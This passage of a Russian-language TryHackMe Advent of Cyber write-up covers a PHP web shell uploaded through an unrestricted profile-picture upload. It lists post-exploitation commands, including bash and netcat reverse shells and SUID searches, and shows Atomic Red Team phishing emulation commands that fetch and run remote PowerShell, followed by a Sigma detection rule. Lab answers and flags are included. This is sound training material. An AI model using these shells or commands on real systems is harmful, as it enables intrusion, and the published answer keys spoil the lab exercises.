        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```
При доступе к указанному выше скрипту отображается поле ввода. Все, что вводится в это поле ввода, затем запускается 
в базовой операционной системе с помощью функции system() PHP , а вывод отображается пользователю. Это идеальный 
файл для загрузки в уязвимое приложение бронирования железнодорожной системы. Уязвимость связана с загрузкой нового 
изображения профиля. Поэтому, чтобы ее эксплуатировать, мы переходим на страницу изображения профиля:

Страница профиля железной дороги

Вместо новой фотографии профиля мы можем загрузить наш вредоносный PHP- скрипт и обновить наш профиль:

Фотография профиля загружена

В случае этого приложения RCE возможен через неограниченную загрузку файла. После загрузки и обновления этой 
"картинки профиля" она сохраняется в /admin/assets/img/profile/каталоге. Затем к файлу можно получить прямой доступ 
через http://<ip-address-or-localhost>/<projectname>/admin/assets/img/profile/shell.php. При доступе к нему мы можем 
увидеть вредоносный код в действии:

Вредоносный код в действии

Теперь мы можем запускать команды непосредственно в операционной системе с помощью этой панели, и вывод будет 
отображаться. Например, запуск команды pwd сейчас возвращает следующее:

Команда выполняется


Извлечь максимальную пользу
После того, как уязвимость была использована и у вас теперь есть доступ к операционной системе через веб-оболочку, 
есть много следующих шагов, которые вы можете предпринять в зависимости от a) какова ваша цель и b) какие 
неправильные конфигурации присутствуют в системе, которые определят, что именно мы можем сделать. Вот несколько 
примеров команд, которые вы можете запустить, получив доступ, и почему вы можете их запустить (если система работает 
на ОС Linux, как наша целевая система в качестве примера):


Команда	Использовать
- ls	Даст вам представление о том, какие файлы/каталоги вас окружают
- cat	Команда, используемая для вывода содержимого документов, таких как текстовые файлы.
- pwd	Даст вам представление о том, где в системе вы находитесь
- whoami	Даст вам знать, кто вы в системе
- name host	Имя системы и ее потенциальная роль в сети
- uname -a	Предоставлю вам некоторую системную информацию, такую как ОС , версия ядра и многое другое.
- id	Если текущий пользователь назначен в какие-либо группы
- ifconfig	Позволяет понять сетевые настройки системы
- bash -i >& /dev/tcp/<your-ip>/<port> 0>&1	Команда, используемая для запуска обратной оболочки через bash.
- nc -e /bin/sh <ваш-ip> <порт>	Команда, используемая для запуска обратного шелла через Netcat
- find / -perm -4000 -type f 2>/dev/null	Находит файлы SUID (Set User ID), что полезно при попытках повышения 
   привилегий, поскольку иногда его можно использовать для выполнения двоичного файла с привилегиями его владельца (который часто является пользователем root)
- find / -записываемый -тип f 2>/dev/null | grep -v "/proc/"	Также полезно при попытках повышения привилегий, 
  используемых для поиска файлов с разрешениями на запись.
Это лишь некоторые команды, которые можно запустить после успешного RCE-эксплойта. Он очень открытый, и то, что вы 
  можете сделать, будет зависеть от ваших способностей инспектировать среду и уязвимости в самой системе.


Практический
Ваша задача сегодня двойная. Во-первых, вы должны получить доступ к Kibana на MACHINE_IP:5601 , чтобы исследовать 
атаку и ответить на синие вопросы ниже.  Затем вы перейдете на сайт Frosty Pines Resort по адресу  
http://frostypines.thm  и воссоздадите атаку, чтобы ответить на красные вопросы и сообщить разработчикам, какой 
элемент сайта был уязвим.

Обратите внимание , чтобы получить доступ к  http://frostypines.thm, Вам нужно будет сослаться на него в файле hosts.
На AttackBox это можно сделать, выполнив следующую команду в терминале: echo "MACHINE_IP frostypines.thm" >> 
/etc/hosts

Если вы не видите IP-адрес (например, 10.10.xx), а видите только IP-адрес МАШИНЫ, убедитесь, что вы запустили 
целевую машину, нажав зеленую кнопку «Запустить машину» выше по задаче, в разделе « Подключение к машине».

Чтобы просмотреть журналы атаки на Frosty Pines Resorts, убедитесь, что вы выбрали коллекцию " frostypines-resorts " в ELK . Например, ниже:

выбор коллекции frostypines-resorts в ELK

Дата и время, которые вам нужно будет использовать при просмотре журналов, будут между 11:30 и 12:00 3 октября 2024 года.

Выделение необходимого диапазона времени и дат в ELK для синего элемента практического применения.

Помните,  чтобы получить доступ к сайту Frosty Pines Resorts ( http://frostypines.thm), Вам нужно будет сослаться на него в вашем файле hosts. На AttackBox это можно сделать, выполнив следующую команду в терминале: echo "MACHINE_IP frostypines.thm" >> /etc/hosts

### Ответьте на вопросы ниже
СИНИЙ : Куда был загружен веб-оболочка?
Формат ответа: /directory/directory/directory/filename.php
```commandline
/media/images/rooms/shell.php
```
СИНИЙ : Какой IP-адрес использовал для доступа к веб-оболочке?
```commandline
10.11.83.34
```
КРАСНЫЙ : Каково содержимое файла flag.txt?
```commandline
THM{Gl1tch_Was_H3r3}
```
Если вам понравилось сегодняшнее задание, вы можете узнать, как использовать возможности  расширенных запросов ELK .
```commandline
Ответ не нужен
```

## Задание 10
SOC -mas приближается! И город Уорвилл начал подготовку к этому грандиозному событию.

Глитч, тихий, талантливый инженер SOC-mas безопасности, предчувствовал, что в этом году празднование будет другим. С 
надвигающимися угрозами он решил обновить оборону безопасности города. Глитч начал укреплять оборону безопасности 
города тихо и тщательно. Он начал с внедрения защитного брандмауэра, исправления уязвимостей и доступа к конечным 
точкам для исправления уязвимостей безопасности. Работая не покладая рук, он оставлял «хлебные крошки», небольшие 
следы своей деятельности.

Не подозревая о благих намерениях Glitch, команда SOC обнаружила аномалии: журналы, показывающие доступ 
администратора, эскалацию привилегий, исправленные системы, ведущие себя по-другому, и инструменты безопасности, 
вызывающие оповещения. Команда SOC неверно истолковала изменения системы как признак внутренней угрозы или 
мошенника-злоумышленника и решила начать расследование с использованием фреймворка Atomic Red Team.

таблетка в виде «конфеты» добавляется в окно пряничного домика

Цели обучения
- Узнайте, как выявлять вредоносные методы с помощью фреймворка MITRE ATT&CK.
- Узнайте, как использовать тесты Atomic Red Team для проведения моделирования атак.
- Узнайте, как создавать правила оповещения и обнаружения на основе тестов атак.

Подключение к машине
Прежде чем двигаться дальше, ознакомьтесь с вопросами в карточке подключения ниже:

Баннер с подробностями подключения для этой комнаты.

Нажмите зеленую кнопку «Запустить машину» ниже, чтобы запустить виртуальную машину, и подождите 1–2 минуты, пока 
система полностью загрузится в режиме разделенного экрана.


Запустить машину
Если виртуальная машина не видна, используйте синюю кнопку «Показать разделенный вид» в верхней части страницы.

Кроме того, если вы хотите подключиться к машине через RDP , используйте указанные ниже учетные данные:

Учетные данные ключа THM
Имя пользователя	Администратор
Пароль	Эмуляция101!
ИС	МАШИНА_IP
На виртуальной машине установлены Atomic Red Team и Sysmon. Это позволит нам эмулировать атаку с использованием TTP, описанных в фреймворке MITRE ATT&CK.

Пробелы в обнаружении
Хотя это может быть утопической мечтой каждого синего тима, мы редко сможем обнаружить каждую атаку или шаг в 
цепочке убийств атаки. Это реальность, с которой сталкиваются все синие тимы: есть пробелы в их обнаружении. Но не 
волнуйтесь! Эти пробелы не обязательно должны быть размером с черную дыру; есть вещи, которые мы можем сделать, 
чтобы помочь сделать эти пробелы меньше.

Пробелы в обнаружении обычно возникают по одной из двух основных причин:

- Безопасность — это игра в кошки-мышки.  По мере того, как мы обнаруживаем больше, субъекты угроз и участники 
«красной команды» найдут новые хитрые способы помешать нашему обнаружению. Затем нам нужно изучить эти новые методы 
  и обновить наши сигнатуры и правила оповещения для обнаружения этих новых методов.
- Граница между аномальным и ожидаемым поведением часто очень тонка и иногда даже имеет значительное перекрытие. 
  Например, предположим, что мы компания, базирующаяся в США. Мы ожидаем, что почти все наши входы в систему будут 
  происходить с IP-адресов в США. Однажды мы получим событие входа с IP-адреса в ЕС, что будет аномалией. Однако это 
  также может быть наш генеральный директор, находящийся в командировке. Это пример того, как нормальное и 
  вредоносное поведение переплетаются, что затрудняет создание точных правил обнаружения, которые не будут слишком 
  шумными.
Синие команды постоянно совершенствуют и улучшают свои правила обнаружения, чтобы закрыть пробелы, которые они 
  испытывают из-за двух упомянутых выше причин. Давайте посмотрим, как это можно сделать!

Кибератаки и «цепочка убийств»
Прежде чем погрузиться в создание новых правил обнаружения, нам сначала нужно обсудить некоторые ключевые темы. 
Первая тема для обсуждения — это цепочка Cyber Kill. Все кибератаки следуют довольно стандартному процессу, 
который довольно хорошо объясняется в Unified Cyber Kill chain:

Поток процессов цепочки Unified Kill.

Как игрок синей команды, мы мечтаем предотвратить все атаки в начале цепочки убийств. Поэтому даже когда субъекты 
угрозы начинают свою разведку, мы уже останавливаем их на месте. Но, как обсуждалось ранее, это невозможно. Затем 
цель немного смещается. Если мы не можем полностью обнаружить и предотвратить субъекта угрозы на любой одной фазе 
цепочки убийств, целью становится выполнение обнаружений по всей цепочке убийств таким образом, что даже если есть 
пробелы в обнаружении на одной фазе, пробел будет закрыт на более поздней фазе. Таким образом, цель состоит в том, 
чтобы гарантировать, что мы можем обнаружить субъекта угрозы до самой последней фазы выполнения цели.

#### МИТР АТАКА&К
Популярная структура для понимания различных методов и тактик, которые субъекты угроз используют через цепь убийств, 
— это структура MITRE ATT&CK . Структура представляет собой набор тактик, методов и процедур, которые, как было 
замечено, были реализованы реальными субъектами угроз. Структура предоставляет инструмент навигации , в котором эти 
TTP могут быть исследованы:

Страница навигатора MITRE ATTACK&CK.

Однако фреймворк в первую очередь обсуждает эти TTP в теоретической манере. Даже если мы знаем, что у нас есть 
разрыв для определенного TTP, мы на самом деле не знаем, как проверить разрыв или закрыть его. Вот тут-то и 
появляются Atomics!

Атомный красный
Библиотека Atomic Red Team представляет собой набор тестовых случаев красной команды, сопоставленных с фреймворком 
MITRE ATT&CK. Библиотека состоит из простых тестовых случаев, которые может выполнить любая синяя команда для 
проверки пробелов в обнаружении и их устранения. Библиотека также поддерживает автоматизацию, при которой методы 
могут выполняться автоматически. Однако их также можно выполнять вручную.

Отбрасывание атомного
У МакСкиди есть смутное представление о том, что случилось со «скомпрометированной машиной». Кажется, кто-то пытался 
использовать Atomic Red Team для имитации атаки на одну из наших систем без разрешения. Преступник также не очистил 
артефакты теста. Давайте посмотрим, что произошло.

Запуск атомного
McSkidy подозревает, что предполагаемый злоумышленник использовал технику MITRE ATT&CK  T1566.001 Spearphishing с 
вложением. Давайте воссоздадим эмуляцию атаки, выполненную предполагаемым злоумышленником, а затем посмотрим на 
созданные артефакты.

Откройте командную строку PowerShell как администратор и следуйте за нами. Давайте начнем с быстрого просмотра 
страницы справки. Введите команду Get-Help Invoke-Atomictest. Вы должны увидеть вывод ниже:

Администратор: Windows
PowerShell
```commandline
PS C:\Users\Administrator> Get-Help Invoke-Atomictest
NAME
    Invoke-AtomicTest

SYNTAX
    Invoke-AtomicTest [-AtomicTechnique] <string[]> [-ShowDetails] [-ShowDetailsBrief] [-TestNumbers <string[]>] 
    [-TestNames <string[]>] [-TestGuids <string[]>] [-PathToAtomicsFolder <string>] [-CheckPrereqs]
    [-PromptForInputArgs] [-GetPrereqs] [-Cleanup] [-NoExecutionLog] [-ExecutionLogPath <string>] [-Force] [-InputArgs<hashtable>] [-TimeoutSeconds <int>] [-Session <PSSession[]>] [-Interactive] [-KeepStdOutStdErrFiles]
    [-LoggingModule <string>] [-WhatIf] [-Confirm]  [<CommonParameters>]

ALIASES
    None

REMARKS
    None
```

Справка выше показывает только, какие параметры доступны, без каких-либо объяснений. Хотя большинство названий 
параметров говорят сами за себя, давайте сделаем краткий обзор параметров, которые мы будем использовать в этом 
пошаговом руководстве:

Параметр	Объяснение	Пример использования
-Atomic Technique

Это определяет, какую технику вы хотите эмулировать. Вы можете использовать полное имя техники или значение "TXXXX". Этот флаг можно опустить.
Invoke-AtomicTest -AtomicTechnique T1566.001

-ShowDetails

Показывает подробную информацию о каждом тесте, включенном в Atomic.	
Invoke-AtomicTest T1566.001 -ShowDetails

-ShowDetailsBrief

Показывает название каждого теста, включенного в Atomic.	
Invoke-AtomicTest T1566.001 -ShowDetailsBrief

-CheckPrereqs

Обеспечивает проверку наличия всех необходимых компонентов для тестирования.	
Invoke-AtomicTest T1566.001 -CheckPrereqs

-TestNames

Задает тесты, которые вы хотите выполнить, используя полное имя атомарного теста.	
Invoke-AtomicTest T1566.001 -TestNames "Download Macro-Enabled Phishing Attachment"

-TestGuids

Задает тесты, которые вы хотите выполнить, используя уникальный идентификатор теста.	
Invoke-AtomicTest T1566.001 -TestGuids 114ccff9-ae6d-4547-9ead-4cd69f687306

-TestNumbers

Устанавливает тесты, которые вы хотите выполнить, используя номер теста. Область действия ограничена Atomic Technique.	Invoke-AtomicTest T1566.001 -TestNumbers 2,3
-Cleanup

Запустите команды очистки, настроенные для возврата состояния вашего компьютера в нормальное состояние.	
Invoke-AtomicTest T1566.001 -TestNumbers 2 -Cleanup

Наша первая команда
Теперь, когда мы знаем, какие параметры доступны, мы можем создать нашу первую команду. Мы хотели бы узнать больше о 
том, что именно происходит, когда мы тестируем технику T1566.001. Чтобы получить эту информацию, мы должны включить 
название техники, о которой мы хотим получить информацию, а затем добавить флаг -ShowDetailsк нашей команде. Давайте 
посмотрим на созданную нами команду: Invoke-AtomicTest T1566.001 -ShowDetails. Эта команда отображает сведения обо 
всех тестах, включенных в T1566.001 Atomic.

Подробности атомного теста T1566.001
```commandline
PS C:\Users\Administrator> Invoke-AtomicTest T1566.001 -ShowDetails
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Phishing: Spearphishing Attachment T1566.001
Atomic Test Name: Download Macro-Enabled Phishing Attachment
Atomic Test Number: 1
Atomic Test GUID: 114ccff9-ae6d-4547-9ead-4cd69f687306
Description: This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating
an end user clicking a phishing link to download the file. The file "PhishingAttachment.xlsm" is downloaded to the %temp
% directory.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$url = 'http://localhost/PhishingAttachment.xlsm'
Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm

Cleanup Commands:
Command:
Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Phishing: Spearphishing Attachment T1566.001
Atomic Test Name: Word spawned a command shell and used an IP address in the command line
Atomic Test Number: 2
Atomic Test GUID: cbb6799a-425c-4f83-9194-5447a909d67f
Description: Word spawning a command prompt then running a command with an IP address in the command line is an indiciat
or of malicious activity. Upon execution, CMD will be lauchned and ping 8.8.8.8

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"

Cleanup Commands:
Command:
Remove-Item #{jse_path} -ErrorAction Ignore
Command (with inputs):
Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore

Dependencies:
Description: Microsoft Word must be installed
Check Prereq Command:
try {
  New-Object -COMObject "#{ms_product}.Application" | Out-Null
  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Check Prereq Command (with inputs):
try {
  New-Object -COMObject "Word.Application" | Out-Null
  $process = "Word"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Get Prereq Command:
Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
Get Prereq Command (with inputs):
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
[!!!!!!!!END TEST!!!!!!!]
```
Вывод выше четко разделен на несколько частей, каждая из которых соответствует тесту. Давайте рассмотрим, какой тип 
информации предоставляется в тесте. Мы будем использовать тест, который хотим запустить, в качестве примера.  

Ключ	Ценить	Описание
Техника	Фишинг : Целевой фишинг. Вложение T1566.001	Полное название метода MITRE ATT&CK, который будет тестироваться
Название атомного теста	Загрузить фишинговое вложение с макросами	Описательное название типа теста, который будет выполнен
Номер атомного теста	1	Тесту присваивается номер; мы можем использовать его в команде, чтобы указать, какой тест мы хотим запустить.
Атомарный тест GUID	114ccff9-ae6d-4547-9ead-4cd69f687306	Данному тесту присваивается уникальный идентификатор; мы можем использовать его в команде, чтобы указать, какой тест мы хотим запустить.
Описание	Этот атомарный тест загружает документ с поддержкой макросов из репозитория Atomic Red Team GitHub, имитируя конечного пользователя, нажимающего на фишинговую ссылку для загрузки файла. Файл "PhishingAttachment.xlsm" загружается в каталог %temp%.	Дает подробное объяснение того, что будет делать тест.
Команды атаки	
Исполнитель: powershell

ElevationRequired: Ложь

Команда: $url = 'http://localhost/PhishingAttachment.xlsm' Invoke-WebRequest -Uri $url -OutFile $env:TEMP.xlsm

Это обеспечивает обзор всех команд, запущенных во время теста, включая исполнителя этих команд и требуемые привилегии. Это также помогает нам определить, где искать артефакты в Windows Event Viewer.
Команды очистки	Команда: Remove-Item $env:TEMP.xlsm -ErrorAction Ignore	Обзор команд, выполняемых для возврата машины в исходное состояние.
Зависимости	Никаких зависимостей не требуется.
Обзор всех необходимых ресурсов, которые должны присутствовать на испытательной машине для выполнения теста.
Фишинг : Эмулированное вложение для целевого фишинга T1566.001

Давайте продолжим и запустим первый тест T1566.001. Перед запуском эмуляции мы должны убедиться, что все необходимые 
ресурсы на месте для ее успешного проведения. Чтобы это проверить, мы можем добавить флаг -Checkprereqк нашей 
команде. Команда должна выглядеть примерно так: Invoke-AtomicTest T1566.001 -TestNumbers 1 -CheckPrereq.

Эта команда будет использовать данные, включенные в часть "зависимости" тестовых данных, чтобы проверить, 
присутствуют ли все требуемые ресурсы. Если посмотреть на зависимости теста 1 T1566.001 Atomic, то никаких 
дополнительных ресурсов не требуется. Запустите ту же команду для теста 2, и она сообщит, что необходимо установить 
Microsoft Word, как показано ниже:

Администратор: Windows
```commandline
PowerShell
PS C:\Users\Administrator> Invoke-AtomicTest T1566.001 -TestNumbers 2 -CheckPrereq
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics
          
CheckPrereq's for: T1566.001-2 Word spawned a command shell and used an IP address in the command line
Prerequisites not met: T1566.001-2 Word spawned a command shell and used an IP address in the command line
[*] Microsoft Word must be installed
          
Try installing prereq's with the -GetPrereqs switch
```

Теперь, когда мы проверили зависимости, давайте продолжим эмуляцию. Выполните следующую команду, чтобы начать 
эмуляцию: Invoke-AtomicTest T1566.001 -TestNumbers 1 и вы должны получить следующий вывод: 

Выполнение атомного теста T1566.001
```commandline
PS C:\Users\Administrator> Invoke-AtomicTest T1566.001 -TestNumbers 1
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics
          
Executing test: T1566.001-1 Download Macro-Enabled Phishing Attachment
Done executing test: T1566.001-1 Download Macro-Enabled Phishing Attachment
```

На основе вывода мы можем определить, что тест был успешно выполнен. Теперь мы можем проанализировать журналы в 
Windows Event Viewer, чтобы найти индикаторы атаки и компрометации.  

#### Обнаружение атомного
Теперь, когда мы выполнили T1566.001 Atomic, мы можем поискать записи журнала, которые указывают нам на эту 
эмулированную атаку. Для этой цели мы будем использовать журналы событий Windows. Эта машина поставляется с 
установленным Sysmon . Системный монитор ( Sysmon ) предоставляет нам подробную информацию о создании процесса, 
сетевых подключениях и изменениях времени создания файла.

Чтобы нам было легче подобрать события, созданные для этой эмуляции, мы сначала начнем с очистки файлов из 
предыдущего теста, выполнив команду Invoke-AtomicTest T1566.001 -TestNumbers 1 -cleanup.

Администратор: Windows
PowerShell
```commandline
PS C:\Users\Administrator> Invoke-AtomicTest T1566.001 -TestNumbers 1 -cleanup
```
Теперь очистим журнал событий Sysmon :

Откройте средство просмотра событий, щелкнув значок на панели задач или выполнив поиск в меню «Пуск».
Перейдите к левой части экрана.Applications and Services => Microsoft => Windows => Sysmon => Operational
Щелкните правой кнопкой Operationalмыши в левой части экрана и нажмите Очистить журнал . Нажмите Очистить, когда появится всплывающее окно.
Теперь, когда мы очистили файлы и журналы sysmon, давайте снова запустим эмуляцию, введя команду Invoke-AtomicTest T1566.001 -TestNumbers 1.

Администратор: Windows
PowerShell
```commandline
PS C:\Users\Administrator> Invoke-AtomicTest T1566.001 -TestNumbers 1
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics
          
Executing test: T1566.001-1 Download Macro-Enabled Phishing Attachment
Done executing test: T1566.001-1 Download Macro-Enabled Phishing Attachment
```
Далее перейдите в Event Viewer и щелкните правой кнопкой мыши Operational log в левой части экрана, а затем щелкните Refresh . Должны появиться новые события, связанные с эмулированной атакой. Теперь отсортируйте таблицу по столбцу Date and Time, чтобы упорядочить события в хронологическом порядке (сначала самые старые). Первые два события в списке — это тесты, которые Atomic выполняет для каждой эмуляции. Нас интересуют 2 события, которые подробно описывают атаку:

Сначала был создан процесс PowerShell для выполнения следующей команды: "powershell.exe" & {$url = 'http://localhost/PhishingAttachment.xlsm' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm}.
Затем был создан файл с именем PhishingAttachment.xlsm.
Нажмите на каждое событие, чтобы увидеть подробности. При выборе события вы должны увидеть подробный обзор всех данных, собранных для этого события. Нажмите на вкладку Details , чтобы отобразить все EventData в удобном для чтения формате. Давайте рассмотрим подробности этих событий ниже. Выделенные данные представляют ценность для реагирования на инциденты и создания правил оповещения.

Результаты выполнения атомарного теста T1566.001 в средстве просмотра событий Windows.

Перейдите в каталог  C:\Users\Administrator\AppData\Local\Temp\и откройте файл PhishingAttachment.txt. Включенный флаг является ответом на вопрос 1. Обязательно ответьте на вопрос сейчас, так как команда очистки удалит этот файл.

Давайте удалим артефакты из нашей эмуляции целевого фишинга. Введите команду Invoke-AtomicTest T1566.001-1 -cleanup.

Теперь, когда мы знаем, какие артефакты были созданы во время этой эмуляции целевого фишинга, мы можем использовать их для создания пользовательских правил оповещения. В следующем разделе мы рассмотрим эту тему подробнее.

Оповещение об атомной
В предыдущем параграфе мы обнаружили несколько индикаторов компрометации через журнал событий Sysmon. Мы можем использовать эту информацию для создания правил обнаружения, которые будут включены в наши EDR, SIEM, IDS и т. д. Эти инструменты предлагают функции, которые позволяют нам импортировать пользовательские правила обнаружения. Существует несколько форматов правил обнаружения, включая Yara, Sigma, Snort и другие. Давайте рассмотрим, как мы можем реализовать артефакты, связанные с T1566.001, для создания пользовательского правила Sigma.

Два события содержали возможные индикаторы компрометации. Давайте сосредоточимся на событии, которое содержало Invoke-WebRequestкомандную строку:

"powershell.exe" & {$url = 'http://localhost/PhishingAttachment.xlsm' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm}"

Мы можем использовать несколько частей этого артефакта для включения в наше пользовательское правило Sigma.

Invoke-WebRequest: Обычно эта команда не запускается из скрипта в фоновом режиме.

$url = 'http://localhost/PhishingAttachment.xlsm': Злоумышленники часто используют определенный вредоносный домен для размещения своих полезных нагрузок. Включение вредоносного URL в правило Sigma может помочь нам обнаружить этот конкретный URL.

PhishingAttachment.xlsm: Это вредоносная полезная нагрузка, загруженная и сохраненная в нашей системе. Мы также можем включить ее имя в правило Sigma.

Объединение всех этих фрагментов информации в правило Sigma будет выглядеть примерно так:

PowerShell
Правило Invoke-WebRequest Sigma
```commandline
title: Detect PowerShell Invoke-WebRequest and File Creation of PhishingAttachment.xlsm
  id: 1
  description: Detects the usage of Invoke-WebRequest to download PhishingAttachment.xlsm and the creation of the file PhishingAttachment.xlsm.
 status: experimental
  author: TryHackMe
  logsource:
    category: process_creation
    product: windows
    service: sysmon
  detection:
   selection_invoke_webrequest:
      EventID: 1
      CommandLine|contains:
        - 'Invoke-WebRequest'
        - 'http://localhost/PhishingAttachment.xlsm'
    
    selection_file_creation:
      EventID: 11  # Sysmon Event ID for File Creation
      TargetFilename|endswith: '\PhishingAttachment.xlsm'
      
    condition: selection_invoke_webrequest or selection_file_creation
  falsepositives:
    - Legitimate administration activity may use Invoke-WebRequest, and legitimate Excel files may be created with similar names.
  level: high
  tags:
    - attack.t1071.001   # Web Service - Application Layer Protocol
    - attack.t1059.001   # PowerShell
    - attack.t1105       # Ingress Tool Transfer
    - attack.t1566.001   # Spearphishing Attachment
```
Часть detection, где происходит эффективное обнаружение. Мы можем ясно видеть артефакты, которые мы обнаружили во время теста эмуляции. Затем мы можем импортировать это правило в основные инструменты, которые мы используем для оповещений, такие как EDR , SIEM , XDR и многие другие.

Теперь, когда Glitch продемонстрировал нам свои намерения, давайте продолжим его работу и запустим эмуляцию программы-вымогателя.

Испытание
Пока Glitch продолжает готовиться к SOC-mas и укрепляет безопасность Wareville, он решает провести симуляцию атаки, которая имитирует атаку вируса-вымогателя по всей среде. Он не уверен в правильных метриках обнаружения для реализации этого теста и просит вас о помощи. Ваша задача — определить правильный атомарный тест для запуска, который будет использовать преимущества интерпретатора команд и скриптов , провести тест и извлечь ценные артефакты, которые будут использованы для создания правила обнаружения.

### Ответьте на вопросы ниже
Какой флаг был обнаружен в файле .txt, который находится в том же каталоге, что и артефакт PhishingAttachment.xslm?
```commandline
THM{GlitchTestingForSpearphishing}
```
Какой идентификатор техники ATT&CK нас интересует?
```commandline
T1059
```
Какой идентификатор подтехники ATT&CK фокусируется на командной оболочке Windows?
```commandline
T1059.003
```
Как называется атомное испытание, которое будет смоделировано?
```commandline
Simulate BlackByte Ransomware Print Bombing
```
Каково название файла, используемого в тесте?
```commandline
Wareville_Ransomware.txt
```
Какой флаг был найден в результате этого атомного испытания?
```commandline
THM{R2xpdGNoIGlzIG5vdCB0aGUgZW5lbXk=}
```
Узнайте больше о  команде Atomic Red Team  в соответствующей  комнате .
```commandline
Ответ не нужен
```
## Задание 11

```commandline
Ответ не нужен
```

## Задание 12

```commandline
Ответ не нужен
```

## Задание 13

```commandline
Ответ не нужен
```

## Задание 14

```commandline
Ответ не нужен
```

## Задание 15

```commandline
Ответ не нужен
```
## Задание 16

```commandline
Ответ не нужен
```

## Задание 17

```commandline
Ответ не нужен
```

## Задание 18

```commandline
Ответ не нужен
```

## Задание 19

```commandline
Ответ не нужен
```

## Задание 20

```commandline
Ответ не нужен
```
## Задание 21

```commandline
Ответ не нужен
```

## Задание 22

```commandline
Ответ не нужен
```

## Задание 23

```commandline
Ответ не нужен
```

## Задание 24

```commandline
Ответ не нужен
```

## Задание 25

```commandline
Ответ не нужен
```
## Задание 26

```commandline
Ответ не нужен
```

## Задание 27

```commandline
Ответ не нужен
```

## Задание 28

```commandline
Ответ не нужен
```

## Задание 29

```commandline
Ответ не нужен
```

## Задание 30

```commandline
Ответ не нужен
```
## Задание 31

```commandline
Ответ не нужен
```

## Задание 32

```commandline
Ответ не нужен
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)